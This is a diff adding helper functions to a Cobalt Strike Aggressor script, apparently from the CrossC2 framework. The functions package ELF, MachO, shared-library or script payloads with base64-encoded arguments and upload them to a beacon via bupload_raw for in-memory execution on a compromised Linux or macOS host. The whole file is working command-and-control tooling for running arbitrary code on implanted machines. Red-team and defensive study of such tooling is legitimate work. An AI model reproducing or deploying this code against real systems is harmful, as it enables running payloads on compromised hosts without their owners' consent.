@@ -1,0 +1,122 @@
+sub random_string {
+    # <3 @offsec_ginger
+    $limit = $1;
+    @random_str = @();
+    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    for ($x = 0; $x < $limit; $x++) {
+        $n = rand(strlen($characters));
+        add(@random_str, charAt($characters, $n));
+    }
+    return join('', @random_str);
+}
+
+sub runType {
+    $type = $1;
+    if ($type eq "ELF" || $type eq "MachO") {
+        return "0";
+    } else if ($type eq "so" || $type eq "dylib") {
+        return "1";
+    }
+    return -1;
+}
+
+
+sub genTaskinfo_dyn {
+    $taskType = $1;
+    $taskName = $2;
+    $taskResType = $3;
+    $juicySize = $4;
+    $transportArg = $5;
+    
+    $taskinfo = "CrossC2^" . $taskType . "^". $taskName . "^" . $taskResType . "^" . $juicySize . "^" . $transportArg;
+    return $taskinfo;
+}
+
+sub genMemScriptInfo {
+    $scriptType = $1;
+    $scriptEngPath = $2;
+    $taskResType = $3;
+    $juicySize = $4;
+    $transportArg = $5;
+    
+    $taskinfo = "CC2-PyScript^" . $scriptType . "^". $scriptEngPath . "^" . $taskResType . "^" . $juicySize . "^" . $transportArg;
+    return $taskinfo;
+}
+
+sub transportArg {
+    $arg = "";
+    foreach $index => $value (@_) {
+        if ($index != 0) {
+            $arg = $arg . "^" .$value;
+        }
+    }
+    return base64_encode($arg);
+}
+
+sub transportArgs {
+    $afterIndex = int($1) - 1;
+    $arg = "";
+    foreach $index => $value ($2) {
+        if ($index > $afterIndex) {
+            $arg = $arg . "^" .$value;
+        }
+    }
+    return base64_encode($arg);
+}
+
+sub transportStrings {
+    $afterIndex = int($1) - 1;
+    $arg = "";
+    $flag = 1;
+    foreach $index => $value ($2) {
+        if ($index > $afterIndex+1) {
+            if ($flag == 1) {
+                $arg = $arg.$value;
+                $flag = 0;
+            } else {
+                $arg = $arg." ".$value;
+            }
+        }
+    }
+    return $arg;
+}
+
+sub bcrossc2_load_dyn {
+    $beaconid = $1;
+    $taskType = $2;
+    $taskName = $3;
+    $taskName = $taskName . random_string(4);
+    $taskResType = $4;
+    $loadFileName = $5;
+    $taskArgs = base64_encode($6);
+
+    $handle = openf(script_resource($loadFileName));
+    $juicyData = readb($handle, -1);
+    closef($handle);
+
+    $juicySize = lof(script_resource($loadFileName));
+    $taskType = runType($taskType);
+    if ($taskType == -1) {
+        berror($beaconid, "[ CrossC2 ]: dynamic lib or executable filetype not found");
+    }
+    $ELFName = genTaskinfo_dyn($taskType, $taskName, $taskResType, $juicySize, $taskArgs);
+    bupload_raw($beaconid,$ELFName,$juicyData);
+}
+
+sub brun_script_in_mem {
+    $beaconid = $1;
+    $scriptType = $2;
+    $scriptEngPath = $3;
+    $taskResType = $4;
+    $loadFileName = $5;
+    $taskArgs = base64_encode($6);
+
+    $handle = openf($loadFileName);
+    $juicyData = readb($handle, -1);
+    closef($handle);
+
+    $juicySize = lof($loadFileName);
+
+    $scriptName = genMemScriptInfo($scriptType, $scriptEngPath, $taskResType, $juicySize, $taskArgs);
+    bupload_raw($beaconid,$scriptName,$juicyData);
+}
